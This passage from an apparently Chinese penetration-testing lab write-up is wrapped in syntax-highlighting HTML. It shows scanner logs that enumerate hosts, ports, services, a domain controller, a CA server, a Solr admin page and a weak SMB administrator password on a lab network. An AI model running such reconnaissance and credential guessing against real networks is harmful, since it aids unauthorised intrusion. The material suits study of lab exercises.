class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">50</span>] [<span class="type">HOST</span>] 目标:<span class="number">172.22</span>.<span class="number">9.19</span> 状态:alive 详情:protocol=ICMP</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">50</span>] [<span class="type">HOST</span>] 目标:<span class="number">172.22</span>.<span class="number">9.7</span> 状态:alive 详情:protocol=ICMP</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">50</span>] [<span class="type">HOST</span>] 目标:<span class="number">172.22</span>.<span class="number">9.26</span> 状态:alive 详情:protocol=ICMP</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">50</span>] [<span class="type">HOST</span>] 目标:<span class="number">172.22</span>.<span class="number">9.47</span> 状态:alive 详情:protocol=ICMP</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">53</span>] [<span class="type">PORT</span>] 目标:<span class="number">172.22</span>.<span class="number">9.19</span> 状态:open 详情:port=<span class="number">22</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">53</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.19</span> 状态:identified 详情:service=ssh, version=<span class="number">8.2</span>p1 Ubuntu <span class="number">4</span>ubuntu0.<span class="number">5</span>, product=OpenSSH, os=Linux, info=Ubuntu Linux; protocol <span class="number">2.0</span>, banner=SSH<span class="literal">-2</span>.<span class="number">0</span><span class="literal">-OpenSSH_8</span>.<span class="number">2</span>p1 Ubuntu<span class="literal">-4ubuntu0</span>.<span class="number">5</span>., port=<span class="number">22</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">53</span>] [<span class="type">PORT</span>] 目标:<span class="number">172.22</span>.<span class="number">9.7</span> 状态:open 详情:port=<span class="number">88</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">53</span>] [<span class="type">PORT</span>] 目标:<span class="number">172.22</span>.<span class="number">9.47</span> 状态:open 详情:port=<span class="number">445</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">53</span>] [<span class="type">PORT</span>] 目标:<span class="number">172.22</span>.<span class="number">9.26</span> 状态:open 详情:port=<span class="number">445</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">54</span>] [<span class="type">PORT</span>] 目标:<span class="number">172.22</span>.<span class="number">9.7</span> 状态:open 详情:port=<span class="number">445</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">54</span>] [<span class="type">PORT</span>] 目标:<span class="number">172.22</span>.<span class="number">9.7</span> 状态:open 详情:port=<span class="number">389</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">54</span>] [<span class="type">PORT</span>] 目标:<span class="number">172.22</span>.<span class="number">9.47</span> 状态:open 详情:port=<span class="number">139</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">54</span>] [<span class="type">PORT</span>] 目标:<span class="number">172.22</span>.<span class="number">9.26</span> 状态:open 详情:port=<span class="number">139</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">54</span>] [<span class="type">PORT</span>] 目标:<span class="number">172.22</span>.<span class="number">9.7</span> 状态:open 详情:port=<span class="number">139</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">54</span>] [<span class="type">PORT</span>] 目标:<span class="number">172.22</span>.<span class="number">9.26</span> 状态:open 详情:port=<span class="number">135</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">54</span>] [<span class="type">PORT</span>] 目标:<span class="number">172.22</span>.<span class="number">9.7</span> 状态:open 详情:port=<span class="number">135</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">54</span>] [<span class="type">PORT</span>] 目标:<span class="number">172.22</span>.<span class="number">9.47</span> 状态:open 详情:port=<span class="number">80</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">54</span>] [<span class="type">PORT</span>] 目标:<span class="number">172.22</span>.<span class="number">9.7</span> 状态:open 详情:port=<span class="number">80</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">54</span>] [<span class="type">PORT</span>] 目标:<span class="number">172.22</span>.<span class="number">9.47</span> 状态:open 详情:port=<span class="number">22</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">54</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.47</span> 状态:identified 详情:version=<span class="number">7.6</span>p1 Ubuntu <span class="number">4</span>ubuntu0.<span class="number">7</span>, product=OpenSSH, os=Linux, info=Ubuntu Linux; protocol <span class="number">2.0</span>, banner=SSH<span class="literal">-2</span>.<span class="number">0</span><span class="literal">-OpenSSH_7</span>.<span class="number">6</span>p1 Ubuntu<span class="literal">-4ubuntu0</span>.<span class="number">7</span>., port=<span class="number">22</span>, service=ssh</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">54</span>] [<span class="type">PORT</span>] 目标:<span class="number">172.22</span>.<span class="number">9.19</span> 状态:open 详情:port=<span class="number">80</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">54</span>] [<span class="type">PORT</span>] 目标:<span class="number">172.22</span>.<span class="number">9.47</span> 状态:open 详情:port=<span class="number">21</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">54</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.47</span> 状态:identified 详情:port=<span class="number">21</span>, service=ftp, version=<span class="number">3.0</span>.<span class="number">3</span>, product=vsftpd, os=Unix, banner=<span class="number">220</span> (vsFTPd <span class="number">3.0</span>.<span class="number">3</span>).</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">54</span>] [<span class="type">PORT</span>] 目标:<span class="number">172.22</span>.<span class="number">9.19</span> 状态:open 详情:port=<span class="number">8983</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">58</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.7</span> 状态:identified 详情:port=<span class="number">88</span>, service=unknown</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">58</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.26</span> 状态:identified 详情:port=<span class="number">445</span>, service=unknown</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">59</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.7</span> 状态:identified 详情:port=<span class="number">445</span>, service=unknown</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">59</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.7</span> 状态:identified 详情:service=unknown, port=<span class="number">389</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">59</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.26</span> 状态:identified 详情:port=<span class="number">139</span>, service=unknown, banner=.</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">59</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.7</span> 状态:identified 详情:port=<span class="number">139</span>, service=unknown, banner=.</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">59</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.19</span> 状态:identified 详情:version=<span class="number">1.18</span>.<span class="number">0</span>, product=nginx, os=Linux, info=Ubuntu, port=<span class="number">80</span>, service=http</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">29</span>:<span class="number">59</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.7</span> 状态:identified 详情:port=<span class="number">80</span>, service=http</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">30</span>:<span class="number">00</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.47</span> 状态:identified 详情:port=<span class="number">80</span>, service=http</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">30</span>:<span class="number">02</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.19</span> 状态:identified 详情:port=<span class="number">8983</span>, service=unknown</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">30</span>:<span class="number">53</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.47</span> 状态:identified 详情:port=<span class="number">445</span>, service=unknown</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">30</span>:<span class="number">54</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.47</span> 状态:identified 详情:port=<span class="number">139</span>, service=unknown</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">30</span>:<span class="number">59</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.26</span> 状态:identified 详情:port=<span class="number">135</span>, service=unknown</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">30</span>:<span class="number">59</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.7</span> 状态:identified 详情:port=<span class="number">135</span>, service=unknown</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">30</span>:<span class="number">59</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.19</span> 状态:identified 详情:port=<span class="number">80</span>, service=http, title=Welcome to nginx!, url=http://<span class="number">172.22</span>.<span class="number">9.19</span>, status_code=<span class="number">200</span>, length=<span class="number">612</span>, server_info=map[<span class="type">content</span>-<span class="type">type</span>:<span class="type">text</span>/<span class="type">html</span> <span class="type">date</span>:<span class="type">Sun</span>, <span class="number">01</span> <span class="type">Jun</span> <span class="number">2025</span> <span class="number">16</span>:<span class="number">30</span>:<span class="number">59</span> <span class="type">GMT</span> <span class="type">etag</span>:<span class="type">W</span>/<span class="string">&quot;62ce8de8-264&quot;</span> <span class="type">last</span>-<span class="type">modified</span>:<span class="type">Wed</span>, <span class="number">13</span> <span class="type">Jul</span> <span class="number">2022</span> <span class="number">09</span>:<span class="number">18</span>:<span class="number">32</span> <span class="type">GMT</span> <span class="type">length</span>:<span class="number">612</span> <span class="type">server</span>:<span class="type">nginx</span>/<span class="number">1.18</span><span class="type">.0</span> (<span class="type">Ubuntu</span>) <span class="type">status_code</span>:<span class="number">200</span> <span class="type">title</span>:<span class="type">Welcome</span> <span class="type">to</span> <span class="type">nginx</span>!], fingerprints=[]</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">30</span>:<span class="number">59</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.7</span> 状态:identified 详情:hostname=XIAORANG<span class="literal">-DC</span>, ipv4=[<span class="number">172.22</span><span class="type">.9.7</span>], ipv6=[]</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">30</span>:<span class="number">59</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.26</span> 状态:identified 详情:ipv4=[<span class="number">172.22</span><span class="type">.9.26</span>], ipv6=[], hostname=DESKTOP<span class="literal">-CBKTVMO</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">30</span>:<span class="number">59</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.47</span> 状态:identified 详情:title=Apache2 Ubuntu Default Page: It works, url=http://<span class="number">172.22</span>.<span class="number">9.47</span>, status_code=<span class="number">200</span>, length=<span class="number">10918</span>, server_info=map[<span class="type">accept</span>-<span class="type">ranges</span>:<span class="built_in">byte</span><span class="type">s</span> <span class="type">content</span>-<span class="type">type</span>:<span class="type">text</span>/<span class="type">html</span> <span class="type">date</span>:<span class="type">Sun</span>, <span class="number">01</span> <span class="type">Jun</span> <span class="number">2025</span> <span class="number">16</span>:<span class="number">30</span>:<span class="number">59</span> <span class="type">GMT</span> <span class="type">etag</span>:<span class="string">&quot;2aa6-5e3ac50b8c6d6-gzip&quot;</span> <span class="type">last</span>-<span class="type">modified</span>:<span class="type">Wed</span>, <span class="number">13</span> <span class="type">Jul</span> <span class="number">2022</span> <span class="number">09</span>:<span class="number">21</span>:<span class="number">51</span> <span class="type">GMT</span> <span class="type">length</span>:<span class="number">10918</span> <span class="type">server</span>:<span class="type">Apache</span>/<span class="number">2.4</span><span class="type">.29</span> (<span class="type">Ubuntu</span>) <span class="type">status_code</span>:<span class="number">200</span> <span class="type">title</span>:<span class="type">Apache2</span> <span class="type">Ubuntu</span> <span class="type">Default</span> <span class="type">Page</span>: <span class="type">It</span> <span class="type">works</span> <span class="type">vary</span>:<span class="type">Accept</span>-<span class="type">Encoding</span>], fingerprints=[], port=<span class="number">80</span>, service=http</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">30</span>:<span class="number">59</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.7</span> 状态:identified 详情:status_code=<span class="number">200</span>, length=<span class="number">703</span>, server_info=map[<span class="type">accept</span>-<span class="type">ranges</span>:<span class="built_in">byte</span><span class="type">s</span> <span class="type">content</span>-<span class="type">length</span>:<span class="number">703</span> <span class="type">content</span>-<span class="type">type</span>:<span class="type">text</span>/<span class="type">html</span> <span class="type">date</span>:<span class="type">Sun</span>, <span class="number">01</span> <span class="type">Jun</span> <span class="number">2025</span> <span class="number">16</span>:<span class="number">30</span>:<span class="number">59</span> <span class="type">GMT</span> <span class="type">etag</span>:<span class="string">&quot;a89b596ddb6d91:0&quot;</span> <span class="type">last</span>-<span class="type">modified</span>:<span class="type">Fri</span>, <span class="number">14</span> <span class="type">Jul</span> <span class="number">2023</span> <span class="number">04</span>:<span class="number">41</span>:<span class="number">16</span> <span class="type">GMT</span> <span class="type">length</span>:<span class="number">703</span> <span class="type">server</span>:<span class="type">Microsoft</span>-<span class="type">IIS</span>/<span class="number">10.0</span> <span class="type">status_code</span>:<span class="number">200</span> <span class="type">title</span>:<span class="type">IIS</span> <span class="type">Windows</span> <span class="type">Server</span>], fingerprints=[], port=<span class="number">80</span>, service=http, title=IIS Windows Server, url=http://<span class="number">172.22</span>.<span class="number">9.7</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">30</span>:<span class="number">59</span>] [<span class="type">VULN</span>] 目标:<span class="number">172.22</span>.<span class="number">9.47</span> 状态:shares<span class="literal">-found</span> 详情:shares=[<span class="type">print</span><span class="variable">$</span> <span class="type">fileshare</span> <span class="type">IPC</span><span class="variable">$</span>], credential=<span class="number">123456</span>, auth_type=password, port=<span class="number">445</span>, service=smb2, username=administrator, domain=</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">30</span>:<span class="number">59</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.19</span> 状态:identified 详情:title=无标题, url=http://<span class="number">172.22</span>.<span class="number">9.19</span>:<span class="number">8983</span>, status_code=<span class="number">302</span>, length=<span class="number">0</span>, server_info=map[<span class="type">length</span>:<span class="number">0</span> <span class="type">location</span>:<span class="type">http</span>://<span class="number">172.22</span><span class="type">.9.19</span>:<span class="number">8983</span>/<span class="type">solr</span>/ <span class="type">redirect_url</span>:<span class="type">http</span>://<span class="number">172.22</span><span class="type">.9.19</span>:<span class="number">8983</span>/<span class="type">solr</span>/ <span class="type">status_code</span>:<span class="number">302</span> <span class="type">title</span>:无标题], fingerprints=[], port=<span class="number">8983</span>, service=http</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">30</span>:<span class="number">59</span>] [<span class="type">VULN</span>] 目标:http://<span class="number">172.22</span>.<span class="number">9.7</span>:<span class="number">80</span> 状态:vulnerable 详情:vulnerability_type=poc<span class="literal">-yaml-active-directory-certsrv-detect</span>, vulnerability_name=, author=AgeloVito, references=[<span class="type">https</span>://<span class="type">www.cnblogs.com</span>/<span class="type">EasonJim</span>/<span class="type">p</span>/<span class="number">6859345</span><span class="type">.html</span>]</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">30</span>:<span class="number">59</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.7</span> 状态:identified 详情:domain_controllers=XIAORANG, port=<span class="number">139</span>, domain_name=XIAORANG, workstation_service=XIAORANG<span class="literal">-DC</span>, server_service=XIAORANG<span class="literal">-DC</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">30</span>:<span class="number">59</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.26</span> 状态:identified 详情:netbios_domain=XIAORANG, netbios_computer=DESKTOP<span class="literal">-CBKTVMO</span>, workstation_service=DESKTOP<span class="literal">-CBKTVMO</span>, server_service=DESKTOP<span class="literal">-CBKTVMO</span>, os_version=Windows Server <span class="number">2016</span> Datacenter <span class="number">14393</span>, port=<span class="number">139</span>, computer_name=DESKTOP<span class="literal">-CBKTVMO</span>.xiaorang.lab, domain_name=xiaorang.lab</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">31</span>:<span class="number">00</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.47</span> 状态:identified 详情:os_version=Windows <span class="number">6.1</span>, port=<span class="number">139</span>, computer_name=fileserver, netbios_domain=FILESERVER, netbios_computer=FILESERVER</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">31</span>:<span class="number">00</span>] [<span class="type">VULN</span>] 目标:<span class="number">172.22</span>.<span class="number">9.47</span> 状态:vulnerable 详情:password=<span class="number">123456</span>, <span class="built_in">type</span>=weak<span class="literal">-password</span>, port=<span class="number">445</span>, service=smb, username=administrator</span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">31</span>:<span class="number">00</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.47</span> 状态:identified 详情:port=<span class="number">445</span>, service=smb, os=Windows <span class="number">6.1</span></span><br><span class="line">[<span class="number">2025</span>-<span class="number">06</span>-<span class="number">02</span> <span class="number">00</span>:<span class="number">31</span>:<span class="number">00</span>] [<span class="type">SERVICE</span>] 目标:<span class="number">172.22</span>.<span class="number">9.19</span> 状态:identified 详情:length=<span class="number">16555</span>, server_info=map[<span class="type">content</span>-<span class="type">security</span>-<span class="type">policy</span>:<span class="type">default</span>-<span class="type">src</span> <span class="string">&#x27;none&#x27;</span>; <span class="type">base</span>-<span class="type">uri</span> <span class="string">&#x27;none&#x27;</span>; <span class="built_in">connect-src</span> <span class="string">&#x27;self&#x27;</span>; <span class="type">form</span>-<span class="type">action</span> <span class="string">&#x27;self&#x27;</span>; <span class="type">font</span>-<span class="type">src</span> <span class="string">&#x27;self&#x27;</span>; <span class="type">frame</span>-<span class="type">ancestors</span> <span class="string">&#x27;none&#x27;</span>; <span class="type">img</span>-<span class="type">src</span> <span class="string">&#x27;self&#x27;</span>; <span class="type">media</span>-<span class="type">src</span> <span class="string">&#x27;self&#x27;</span>; <span class="type">style</span>-<span class="type">src</span> <span class="string">&#x27;self&#x27;</span> <span class="string">&#x27;unsafe-inline&#x27;</span>; <span class="type">script</span>-<span class="type">src</span> <span class="string">&#x27;self&#x27;</span>; <span class="type">worker</span>-<span class="type">src</span> <span class="string">&#x27;self&#x27;</span>; <span class="type">content</span>-<span class="type">type</span>:<span class="type">text</span>/<span class="type">html</span>;<span class="built_in">char</span><span class="type">set</span>=<span class="type">utf</span>-<span class="number">8</span> <span class="type">length</span>:<span class="number">16555</span> <span class="type">status_code</span>:<span class="number">200</span> <span class="type">title</span>:<span class="type">Solr</span> <span class="type">Admin</span> <span class="type">vary</span>:<span class="type">Accept</span>-<span class="type">Encoding</span>, <span class="type">User</span>-<span class="type">Agent</span> <span class="type">x</span>-<span class="type">content</span>-<span class="type">type</span>-<span class="type">options</span>:<span class="type">nosniff</span> <span class="type">x</span>-<span class="type">frame</span>-<span class="type">options</span>:<span class="type">SAMEORIGIN</span> <span class="type">x</span>-<span class="type">xss</span>-<span class="type">protection</span>:<span class="number">1</span>; <span class="type">mode</span>=<span class="type">block</span>], fingerprints=[], port=<span class="number">8983</span>, service=http, title=Solr Admin, url=http://<span class="number">172.22</span>.<span class="number">9.19</span>:<span class="number">8983</span>/solr/, status_code=<span class="number">200</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">start</span> infoscan</span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.47</span>:<span class="number">21</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.19</span>:<span class="number">22</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.47</span>:<span class="number">22</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.19</span>:<span class="number">80</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.47</span>:<span class="number">80</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.26</span>:<span class="number">80</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.13</span>:<span class="number">135</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.7</span>:<span class="number">135</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.26</span>:<span class="number">135</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.7</span>:<span class="number">139</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.13</span>:<span class="number">139</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.47</span>:<span class="number">139</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.26</span>:<span class="number">139</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.26</span>:<span class="number">445</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.13</span>:<span class="number">445</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.7</span>:<span class="number">445</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.47</span>:<span class="number">445</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.7</span>:<span class="number">88</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">9.19</span>:<span class="number">8983</span> open</span><br><span class="line">[*] alive ports len is: <span class="number">19</span></span><br><span class="line"><span class="built_in">start</span> vulscan</span><br><span class="line">已完成 <span class="number">7</span>/<span class="number">19</span> [-] webtitle http://<span class="number">172.22</span>.<span class="number">9.19</span>:<span class="number">8983</span> Get <span class="string">&quot;http://172.22.9.19:8983&quot;</span>: dial tcp <span class="number">172.22</span>.<span class="number">9.19</span>:<span class="number">8983</span>: connect: connection refused</span><br><span class="line">[*] WebTitle: http://<span class="number">172.22</span>.<span class="number">9.19</span>        code:<span class="number">200</span> len:<span class="number">612</span>    title:Welcome to nginx!</span><br><span class="line">[*] WebTitle: http://<span class="number">172.22</span>.<span class="number">9.47</span>        code:<span class="number">200</span> len:<span class="number">10918</span>  title:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]<span class="number">172.22</span>.<span class="number">9.26</span></span><br><span class="line">   [-&gt;]DESKTOP<span class="literal">-CBKTVMO</span></span><br><span class="line">   [-&gt;]<span class="number">172.22</span>.<span class="number">9.26</span></span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]<span class="number">172.22</span>.<span class="number">9.13</span></span><br><span class="line">   [-&gt;]CA01</span><br><span class="line">   [-&gt;]<span class="number">172.22</span>.<span class="number">9.13</span></span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]<span class="number">172.22</span>.<span class="number">9.7</span></span><br><span class="line">   [-&gt;]XIAORANG<span class="literal">-DC</span></span><br><span class="line">   [-&gt;]<span class="number">172.22</span>.<span class="number">9.7</span></span><br><span class="line">[*] NetBios: <span class="number">172.22</span>.<span class="number">9.47</span>     fileserver                          Windows <span class="number">6.1</span> </span><br><span class="line">[*] NetBios: <span class="number">172.22</span>.<span class="number">9.7</span>      [+]DC XIAORANG\XIAORANG<span class="literal">-DC</span>     </span><br><span class="line">[*] NetBios: <span class="number">172.22</span>.<span class="number">9.13</span>     XIAORANG\CA01                  </span><br><span class="line">[*] NetBios: <span class="number">172.22</span>.<span class="number">9.26</span>     XIAORANG\DESKTOP<span class="literal">-CBKTVMO</span>       </span><br><span class="line">[*] WebTitle: http://<span class="number">172.22</span>.<span class="number">9.26</span>        code:<span class="number">200</span> len:<span class="number">703</span>    title:IIS Windows Server</span><br><span class="line">已完成 <span class="number">19</span>/<span class="number">19</span></span><br><span class="line">[*] 扫描结束,耗时: <span class="number">4</span>m45.<span class="number">023061289</span>s</span><br></pre></td></tr></table></figure><p>整理一下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 